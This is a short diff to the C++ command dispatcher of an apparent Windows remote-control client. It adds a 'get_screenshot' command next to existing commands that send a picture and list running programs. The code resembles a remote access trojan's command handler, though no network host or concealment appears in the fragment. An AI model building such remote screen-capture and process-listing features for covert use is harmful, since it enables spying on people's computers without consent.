@@ -42,7 +42,9 @@ void execute_command(const string& command) {
     }
   } else if (trimmed_cmd.find("get_picture") == 0) {
     send_picture();
-  } else if (trimmed_cmd.find("list_program") == 0) {
+  } else if (trimmed_cmd.find("get_screenshot") == 0) {
+    send_screenshot();
+  }else if (trimmed_cmd.find("list_program") == 0) {
     list_programs();
     Sleep(1000);
     ifstream test_file("process_list.txt");
